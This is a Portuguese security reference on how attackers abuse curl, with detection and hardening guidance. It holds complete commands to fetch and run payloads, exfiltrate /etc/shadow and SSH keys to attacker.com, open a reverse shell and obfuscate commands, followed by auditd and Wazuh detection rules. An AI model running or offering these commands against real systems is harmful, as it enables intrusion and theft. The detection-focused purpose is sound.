# curl

**Plataforma:** Linux / macOS / Windows (versões recentes)

**Categorias:** Download, Upload, Exfiltração, Shell reverso, Tunelamento

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1048.003 (Exfiltration Over Alternative Protocol), T1071.001 (Web Protocols)

**Referência ofensiva:** https://gtfobins.org/gtfobins/curl/

---

## O que é o curl

O curl é uma ferramenta de linha de comando para transferência de dados via protocolo de rede. Está presente por padrão na maioria das distribuições Linux modernas, no macOS e no Windows 10/11 a partir de certas versões. Suporta dezenas de protocolos: HTTP, HTTPS, FTP, SFTP, SCP, SMB, LDAP, DICT, IMAP, entre outros.

Por ser uma ferramenta legítima amplamente usada por desenvolvedores, administradores de sistemas e pipelines de CI/CD, o curl raramente é bloqueado por padrão, o que o torna muito atraente para atacantes em ambiente pós-exploração.

---

## Por que atacantes usam o curl

O curl resolve três problemas fundamentais em um ataque:

1. Já está instalado — não é necessário transferir nenhuma ferramenta adicional
2. O tráfego parece legítimo — requisições HTTP/HTTPS saem pelo mesmo caminho que o tráfego normal da aplicação
3. É versátil — serve tanto para trazer payloads para dentro quanto para tirar dados para fora

Em campanhas reais, o curl aparece com frequência na fase de Command and Control (C2) e na exfiltração de dados. Grupos como Lazarus, APT41 e operadores de ransomware como LockBit e BlackCat documentadamente utilizaram o curl ou comportamento equivalente para essas finalidades.

---

## Técnicas de abuso

### Download de payloads e ferramentas

O uso mais simples é baixar um arquivo de um servidor controlado pelo atacante. Esse arquivo pode ser um script de shell, um binário de C2, um ransomware ou qualquer outra ferramenta.

```bash
# Baixar um arquivo e salvar no disco
curl http://attacker.com/payload.sh -o /tmp/payload.sh

# Baixar e executar diretamente em memória, sem tocar o disco
curl http://attacker.com/payload.sh | bash

# Versão silenciosa, sem barra de progresso
curl -s http://attacker.com/payload.sh | bash

# Baixar com nome diferente para dificultar identificação
curl -s http://attacker.com/update.bin -o /tmp/.cache_update

# HTTPS para cifrar o conteúdo em trânsito e evitar inspeção SSL básica
curl -sk https://attacker.com/payload.sh | bash
```

O uso do pipe direto para `bash` é especialmente perigoso porque o payload nunca é gravado em disco, dificultando a análise forense posterior. Soluções de EDR que monitoram apenas criação de arquivos não capturam esse comportamento.

### Upload e exfiltração de dados

O curl suporta envio de arquivos via HTTP POST, PUT e vários outros métodos, o que o torna útil para exfiltração.

```bash
# Exfiltrar um arquivo via HTTP PUT
curl -T /etc/shadow http://attacker.com/upload/shadow

# Exfiltrar via POST com campo de formulário
curl -X POST -F "file=@/etc/passwd" http://attacker.com/collect

# Exfiltrar via POST com dados em JSON (parece tráfego de API legítima)
curl -X POST -H "Content-Type: application/json" \
  -d "{\"data\": \"$(base64 /etc/shadow)\"}" \
  https://attacker.com/api/v1/telemetry

# Exfiltrar vários arquivos em sequência
for f in /home/*/.ssh/id_rsa; do
  curl -s -X POST -F "file=@$f" http://attacker.com/collect
done
```

O uso de base64 embutido na requisição JSON é particularmente eficaz contra proxies que inspecionam apenas o Content-Type e não o corpo da requisição.

### Exfiltração via DNS

Quando o tráfego HTTP de saída está bloqueado ou monitorado, é possível exfiltrar dados via requisições DNS usando o suporte do curl ao protocolo DNS.

```bash
# Exfiltrar conteúdo de arquivo via subdomínio DNS (chunk por chunk)
data=$(cat /etc/passwd | base64 | tr -d '\n')
curl "http://${data}.attacker.com/"

# Alternativa com tamanho controlado para evitar limites de DNS (253 chars max)
cat /etc/passwd | base64 | fold -w 60 | while read chunk; do
  curl -s "http://${chunk}.exfil.attacker.com/" > /dev/null
done
```

Esse método é lento, mas frequentemente não é monitorado em ambientes que não fazem logging de DNS.

### Shell reverso

O curl pode ser encadeado com interpretadores presentes no sistema para estabelecer um shell reverso — uma conexão de saída do alvo para o atacante que fornece execução de comandos interativa.

```bash
# Baixar e executar um script de shell reverso
curl -s http://attacker.com/revshell.sh | bash

# Usar curl para staging: baixa um script que baixa e executa o agente de C2
curl -s http://attacker.com/stage1.sh -o /tmp/.s1 && chmod +x /tmp/.s1 && /tmp/.s1

# Em sistemas com bash e /dev/tcp disponível, o curl serve apenas de stager inicial
curl -s http://attacker.com/s | bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### Leitura de arquivos locais (SSRF interno)

O curl suporta o schema `file://`, que permite ler arquivos locais do sistema. Isso é relevante em cenários de SSRF onde o servidor faz requisições curl com input controlável.

```bash
# Ler arquivo local via file://
curl file:///etc/passwd
curl file:///root/.ssh/id_rsa

# Ler com redirecionamento para exfiltração
curl file:///etc/shadow | curl -X POST -d @- http://attacker.com/collect
```

Em aplicações web que recebem URLs como parâmetro e internamente executam curl (SSRF), esse vetor permite leitura de arquivos sensíveis do servidor.

### Pivoting e acesso a serviços internos via SSRF

Quando o curl é executado em um servidor com acesso à rede interna, pode ser usado para descobrir e acessar serviços que não estão expostos externamente.

```bash
# Varrer portas internas (muito lento, mas funciona)
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -s --connect-timeout 1 http://192.168.1.1:$port -o /dev/null && echo "Porta $port aberta"
done

# Acessar o metadata service da AWS (IMDSv1)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Acessar metadata do GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Acessar serviço Redis interno sem autenticação
curl -s telnet://127.0.0.1:6379 --upload-file redis_commands.txt
```

---

## Técnicas de bypass e evasão

### Evasão de monitoramento de User-Agent

Muitas soluções de segurança filtram ou alertam para o User-Agent padrão do curl (`curl/X.X.X`). Atacantes frequentemente substituem o User-Agent por algo que parece tráfego legítimo de navegador.

```bash
# Simular Firefox
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" \
  http://attacker.com/payload

# Simular Chrome
curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
  https://attacker.com/payload
```

### Evasão de inspeção SSL corporativa

Ambientes com proxy HTTPS que fazem man-in-the-middle para inspeção de tráfego podem ser contornados com certificados pinados ou flags que ignoram validação de certificado.

```bash
# Ignorar erros de certificado (útil quando o certificado do C2 é autoassinado)
curl -k https://attacker.com/payload | bash

# Especificar um CA bundle próprio (para comunicação com C2 que usa cert próprio)
curl --cacert /tmp/.ca.pem https://c2.attacker.com/cmd
```

### Uso de protocolos alternativos

Quando HTTP está monitorado, o curl suporta outros protocolos que podem passar despercebidos.

```bash
# Transferência via FTP
curl ftp://attacker.com/payload.sh -o /tmp/p.sh

# DNS over HTTPS (DoH) para resolver nomes sem expor queries DNS ao monitoramento local
curl --doh-url https://cloudflare-dns.com/dns-query https://attacker.com/payload

# Uso de IPv6 para contornar regras de firewall baseadas em IPv4
curl http://[2001:db8::1]/payload.sh | bash
```

### Fragmentação e ofuscação do comando

Para dificultar a detecção por análise de linha de comando, atacantes fragmentam o comando ou usam variáveis de ambiente.

```bash
# Construção por variáveis para evitar detecção por palavras-chave
u="http://attac"
v="ker.com/pay"
w="load.sh"
curl -s "${u}${v}${w}" | bash

# Uso de redirecionamento e here-string para ocultar argumentos
curl -s $(echo "aHR0cDovL2F0dGFja2VyLmNvbS9wYXlsb2FkLnNo" | base64 -d) | bash
```

---

## Detecção

### O que monitorar

A detecção de abuso do curl deve combinar múltiplos indicadores de contexto, pois o simples uso do curl não é suficiente para confirmar uma atividade maliciosa.

**Indicadores de alta relevância:**

- curl sendo executado com parent process de servidor web (apache2, nginx, php-fpm, tomcat)
- curl com pipe para bash, sh, python ou qualquer interpretador
- curl usando schema `file://`
- curl executado por usuários de sistema (www-data, nobody, daemon) fazendo conexão para IPs externos
- curl com flag `-k` ou `--insecure` contra domínios externos desconhecidos
- curl com User-Agent diferente do padrão da ferramenta

**Indicadores de média relevância:**

- curl com flag `-T` ou `--upload-file` enviando dados para exterior
- curl executado em horários fora do expediente
- curl fazendo upload de arquivos sensíveis (/etc/passwd, /etc/shadow, /root/*, /home/*/.ssh/*)
- curl chamando IPs diretamente (sem hostname), especialmente em faixas de nuvem pouco comuns

### Configuração do auditd

Adicione ao `/etc/audit/rules.d/lolbins.rules`:

```bash
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/curl -k curl_exec
-a always,exit -F arch=b32 -S execve -F exe=/usr/bin/curl -k curl_exec
```

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0100-gtfobins_network.xml -->

<group name="lolbins,gtfobins,linux,network">

  <!-- curl executado por processo filho de servidor web — crítico -->
  <rule id="100200" level="14">
    <if_group>auditd</if_group>
    <field name="audit.command">curl</field>
    <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
    <description>curl executado por conta de serviço web (possível RCE ou webshell)</description>
    <mitre>
      <id>T1105</id>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- curl com pipe para interpretador (execução em memória) -->
  <rule id="100201" level="12">
    <if_group>auditd</if_group>
    <field name="audit.command">curl</field>
    <field name="audit.execve" type="pcre2">bash|sh|python|perl|ruby|php</field>
    <description>curl com pipe para interpretador — possível execução de payload em memória</description>
    <mitre>
      <id>T1105</id>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- curl acessando arquivo local via file:// -->
  <rule id="100202" level="12">
    <if_group>auditd</if_group>
    <field name="audit.command">curl</field>
    <field name="audit.execve" type="pcre2">file://</field>
    <description>curl usando schema file:// — possível leitura de arquivo sensível ou SSRF interno</description>
    <mitre>
      <id>T1005</id>
      <id>T1083</id>
    </mitre>
  </rule>

  <!-- curl com upload (-T ou --upload-file) para exterior -->
  <rule id="100203" level="11">
    <if_group>auditd</if_group>
    <field name="audit.command">curl</field>
    <field name="audit.execve" type="pcre2">-T\s|--upload-file</field>
    <description>curl enviando arquivo para servidor externo — possível exfiltração</description>
    <mitre>
      <id>T1048.003</id>
    </mitre>
  </rule>

  <!-- curl ignorando validação SSL (-k ou --insecure) -->
  <rule id="100204" level="9">
    <if_group>auditd</if_group>
    <field name="audit.command">curl</field>
    <field name="audit.execve" type="pcre2">\s-k\s|\s-k$|--insecure</field>
    <description>curl com validação SSL desabilitada — comum em comunicação com C2 autoassinado</description>
    <mitre>
      <id>T1071.001</id>
    </mitre>
  </rule>

</group>
```

### Falsos positivos comuns e como reduzir o ruído

**Scripts de healthcheck e monitoramento** — ferramentas como Nagios, Zabbix e Prometheus usam curl para verificar disponibilidade de serviços. Filtre pelo usuário do agente de monitoramento e pelo destino (IPs internos ou endpoints específicos conhecidos).

**Pipelines de CI/CD** — Jenkins, GitLab CI e GitHub Actions frequentemente usam `curl | bash` para instalar dependências. Filtre pelo usuário de serviço do CI (ex: `jenkins`, `gitlab-runner`) e por um range de IPs de repositórios conhecidos.

**Scripts de inicialização e cloud-init** — instâncias de nuvem frequentemente executam `curl` no boot para buscar configurações. Filtre por janelas de tempo próximas ao boot do sistema (`uptime < 5 min`).

**Aplicações legítimas com upload** — soluções de backup e monitoramento de logs podem fazer upload de dados. Mapeie essas aplicações e filtre por usuário e destino esperado.

---

## Proteção e controles defensivos

**Restringir acesso ao curl por aplicações web:** se sua aplicação web não precisa fazer requisições de saída, bloqueie o acesso ao curl via controles de sistema de arquivos (chmod, ACL) ou AppArmor/SELinux. Um perfil AppArmor para o servidor web que não permita execução de curl é eficaz.

**Regras de egress no firewall:** defina quais processos podem fazer conexões de saída e para quais destinos. Em Linux, iptables ou nftables com módulo owner permitem restringir conexões de saída por UID.

```bash
# Bloquear conexões de saída para www-data exceto para IPs específicos
iptables -A OUTPUT -m owner --uid-owner www-data -d 203.0.113.10 -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner www-data -j DROP
```

**Inspeção de proxy com SSL inspection:** em ambientes controlados, fazer MITM no tráfego HTTPS de saída permite inspecionar o conteúdo de requisições curl e detectar downloads de payloads ou uploads de dados sensíveis.

**Monitoramento de parent process:** a combinação "servidor web → curl → interpretador" é quase sempre maliciosa. Implementar alertas específicos para essa cadeia de processos tem baixíssima taxa de falso positivo.

**Remover ou restringir o binário:** em servidores de produção que não precisam de curl, remover o binário ou colocar ACL restritiva reduz significativamente a superfície de abuso. Considere que o curl pode ser recompilado ou substituído por versão estática, então controles de whitelist de hash de binário (via IMA ou Wazuh FIM) complementam essa medida.

---

## Referências

- GTFOBins — curl: https://gtfobins.org/gtfobins/curl/
- MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1048: https://attack.mitre.org/techniques/T1048/
- MITRE ATT&CK T1071: https://attack.mitre.org/techniques/T1071/
- curl man page: https://curl.se/docs/manpage.html
